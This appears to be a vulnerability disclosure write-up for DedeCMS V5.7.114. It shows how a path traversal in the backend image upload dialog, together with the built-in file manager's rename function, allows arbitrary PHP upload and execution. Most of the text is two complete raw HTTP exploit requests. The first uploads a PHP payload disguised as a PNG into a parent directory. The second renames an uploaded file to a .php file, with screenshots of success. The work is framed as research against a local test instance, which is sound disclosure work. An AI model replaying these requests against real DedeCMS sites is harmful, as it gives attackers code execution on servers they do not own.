# Dedecms Path traversal+arbitrary file upload(other enter)

​	The zip compression file upload function of the Dreamweaver backend software manager has vulnerabilities such as path traversal and arbitrary file upload

![image-20240708130926507](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitThree.assets/image-20240708130926507.png)

​	E: \ seebug \ phpstudy_pro is the root directory of my current web integration environment deployment. The current project is deployed in the 127.0.0.1-9600 folder under the WWW path.This time I chose E:\seebug\phpstudy_pro\WWW\127.0.0.1_9600\ as the destination path for file upload, because PHP scripts can be parsed in this fileWS

​	visit http://127.0.0.1:9600/dede/ And log in to the backend of dedecms to create a new atlas list http://127.0.0.1:9600/dede/album_add.php The interface is shown below

![image-20240712135020653](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitThree.assets/image-20240712135020653-1720767849469-41.png)

​	vulnerability mainly appears at the compressed file upload location

![image-20240712145034349](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitThree.assets/image-20240712145034349-1720767854033-44.png)

```http
POST /include/dialog/select_images_post.php HTTP/1.1
Host: 127.0.0.1:9600
Content-Length: 1971
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:9600
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3Mt7CAkNjyzWYBFm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:9600/include/dialog/select_images.php?f=form1.picname&noeditor=yes&imgstick=undefined
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9fvqmoiniui5peunoom189bb23; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=1ebb58ecac915613; _csrf_name_2f6ef1b1=267c4d98da681002ab955b10f8e0e3c3; _csrf_name_2f6ef1b11BH21ANI1AGD297L1FF21LN02BGE1DNG=1d4b8a59aa88baa3; DedeLoginTime=1720418572; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=9c25d28547e20a28; ENV_GOBACK_URL=%2Fdede%2Fcontent_list.php
Connection: close

------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="noeditor"

yes
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="activepath"

/uploads/..
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="f"

form1.picname
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="v"

picview
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="imgstick"

undefined
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="CKEditorFuncNum"

1
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="job"

upload
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="imgfile"; filename="0.php.png"
Content-Type: image/png

<?php echo 123;?>
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="iwidth"

240
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="iheight"

180
------WebKitFormBoundary3Mt7CAkNjyzWYBFm
Content-Disposition: form-data; name="sb1"

确定
------WebKitFormBoundary3Mt7CAkNjyzWYBFm--
```

​	`Select_images_post. php 'did not perform sufficient filtering on the activepath parameter, so it is possible to bypass the file suffix blacklist by modifying the value of activepath to a file name with a suffix of' php ', and combined with the first two path traversal vulnerabilities to achieve arbitrary file upload vulnerabilities

![image-20240708150758976](E:\360MoveData\Users\HideInDarkness\Desktop\dedecms\dedecms\V5.7.114-UTF8\V5.7.114-UTF8ExploitThree.assets\image-20240708150758976-1720767860876-47.png)

​	Here, you can also use the built-in file management system in the 'dedecms' backend to rename files and enable them to parse and run normally.

```http
POST /dede/file_manage_control.php HTTP/1.1
Host: 127.0.0.1:9600
Content-Length: 147
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:9600
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1:9600/dede/file_manage_view.php?fmdo=rename&filename=inde1x.Php&activepath=%2Fuploads
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=9fvqmoiniui5peunoom189bb23; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=1ebb58ecac915613; _csrf_name_2f6ef1b1=ef87ce85f5d16c9875d2c6089936835b; _csrf_name_2f6ef1b11BH21ANI1AGD297L1FF21LN02BGE1DNG=c1e0489e3c20f4bf; last_vtime=1720421835; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=070401ac415b7cb7; last_vid=admin; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=501af9a85db1a161; OrdersId=9448BQQIAFJRAgIFAQIIXQINU1cPAAFRVAIGAwY2FGYEVQAFAAoGVlAAYHsGBgY; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D6; DedeLoginTime=1720426605; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=629ca267a38c9755; Shop_De_85=626cVlNVBgkHU1FVU1QBAAFTDwVTCVJXUgkDUlNbAV8OB0QWEQxVXApTRxANCxBFCkVVRxpfRFtcARdACkYJBwsXJ1VGXQYcDyJEIFtHJXMSIXYXJgkUdycVcHBGd1ZHDgJHXiFAcw0SISBAWyE; Shop_De_78=b741AwUHVAQBCAIBUlIFVwhVWg8GXwMEAAVaClRQAgUCARBDR14HUQwNAhcXWFkVQgxHc1NDCXETdyAUBkwfVkBUCwITQw1AXV0PFCcFFVkBFFp3QCMFF3dyRgsiHCMNEHhyFgwHQXECHQoBRw5y
Connection: close

fmdo=rename&activepath=%2F240708&filename=1-240FQ50614S6.png&oldfilename=1-240FQ50614S6.png&newfilename=index1.php&imageField1.x=31&imageField1.y=6
```

![image-20240708165441039](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitThree.assets/image-20240708165441039-1720767867223-50.png)

![image-20240708164949322](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitThree.assets/image-20240708164949322-1720767870470-53.png)

​	Successfully modified '127.0.0.1,9600 \ 240708 \ 1-240FQ50614S6. png' to '127.0.0.1,9600 \ 240708 \ index1php'`

![image-20240708165348465](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitThree.assets/image-20240708165348465-1720767876084-56.png)